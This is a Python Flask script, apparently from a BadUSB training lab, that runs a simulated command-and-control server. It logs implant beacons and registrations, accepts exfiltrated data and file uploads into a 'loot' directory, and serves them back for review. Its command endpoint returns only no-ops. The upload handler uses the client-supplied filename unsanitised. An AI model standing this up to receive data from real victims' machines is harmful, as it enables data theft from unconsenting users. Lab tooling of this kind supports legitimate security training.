#!/usr/bin/env python3
"""
C2 Simulation Server
For BadUSB training lab - receives beacons and collects data

NOT FOR MALICIOUS USE - Training purposes only
"""

from flask import Flask, request, jsonify
from datetime import datetime
import json
import os
import base64

app = Flask(__name__)

LOOT_DIR = "/app/loot"
os.makedirs(LOOT_DIR, exist_ok=True)

def log_event(event_type, data):
    """Log events to file"""
    timestamp = datetime.now().isoformat()
    log_entry = {
        "timestamp": timestamp,
        "type": event_type,
        "data": data,
        "source_ip": request.remote_addr
    }

    log_file = os.path.join(LOOT_DIR, f"c2_log_{datetime.now().strftime('%Y%m%d')}.json")

    with open(log_file, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

    print(f"[{timestamp}] {event_type}: {request.remote_addr}")
    return log_entry

@app.route("/")
def index():
    """Health check"""
    return jsonify({"status": "ok", "service": "C2 Training Server"})

@app.route("/beacon", methods=["GET", "POST"])
def beacon():
    """Receive beacon check-ins"""
    if request.method == "POST":
        data = request.get_json() or request.form.to_dict() or request.data.decode()
    else:
        data = request.args.to_dict()

    log_event("beacon", data)
    return jsonify({"status": "ok", "command": "sleep"})

@app.route("/collect", methods=["POST"])
def collect():
    """Receive exfiltrated data"""
    data = request.get_json() or request.form.to_dict() or {"raw": request.data.decode()}

    log_event("exfil", data)

    # Save raw data
    filename = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{request.remote_addr.replace('.', '_')}.txt"
    filepath = os.path.join(LOOT_DIR, filename)

    with open(filepath, "w") as f:
        if isinstance(data, dict):
            json.dump(data, f, indent=2)
        else:
            f.write(str(data))

    return jsonify({"status": "received", "file": filename})

@app.route("/upload", methods=["POST"])
def upload():
    """Receive file uploads"""
    if "file" in request.files:
        file = request.files["file"]
        filename = f"upload_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
        filepath = os.path.join(LOOT_DIR, filename)
        file.save(filepath)
        log_event("upload", {"filename": filename, "size": os.path.getsize(filepath)})
        return jsonify({"status": "uploaded", "file": filename})

    # Handle base64 encoded data
    data = request.get_json() or {}
    if "data" in data:
        try:
            decoded = base64.b64decode(data["data"])
            filename = f"upload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
            filepath = os.path.join(LOOT_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(decoded)
            log_event("upload", {"filename": filename, "size": len(decoded)})
            return jsonify({"status": "uploaded", "file": filename})
        except:
            pass

    return jsonify({"status": "error", "message": "No file received"})

@app.route("/command/<hostname>", methods=["GET"])
def get_command(hostname):
    """Return command for specific host (for polling C2)"""
    # In a real C2, this would return queued commands
    # For training, we return no-op
    log_event("command_poll", {"hostname": hostname})
    return jsonify({"command": "none"})

@app.route("/register", methods=["POST"])
def register():
    """Register new implant"""
    data = request.get_json() or request.form.to_dict()
    log_event("register", data)
    return jsonify({"status": "registered", "id": datetime.now().strftime('%Y%m%d%H%M%S')})

@app.route("/logs")
def view_logs():
    """View collected logs (for training review)"""
    logs = []
    for filename in sorted(os.listdir(LOOT_DIR)):
        if filename.startswith("c2_log_"):
            filepath = os.path.join(LOOT_DIR, filename)
            with open(filepath, "r") as f:
                for line in f:
                    try:
                        logs.append(json.loads(line))
                    except:
                        pass
    return jsonify({"logs": logs[-100:]})  # Last 100 entries

@app.route("/loot")
def list_loot():
    """List collected loot files"""
    files = []
    for filename in os.listdir(LOOT_DIR):
        filepath = os.path.join(LOOT_DIR, filename)
        files.append({
            "filename": filename,
            "size": os.path.getsize(filepath),
            "modified": datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
        })
    return jsonify({"files": files})

if __name__ == "__main__":
    print("=" * 50)
    print("C2 Training Server")
    print("=" * 50)
    print("Endpoints:")
    print("  GET  /           - Health check")
    print("  *    /beacon     - Beacon check-in")
    print("  POST /collect    - Data exfiltration")
    print("  POST /upload     - File upload")
    print("  POST /register   - Implant registration")
    print("  GET  /logs       - View logs")
    print("  GET  /loot       - List loot files")
    print("=" * 50)

    app.run(host="0.0.0.0", port=int(os.environ.get("C2_PORT", 8888)))
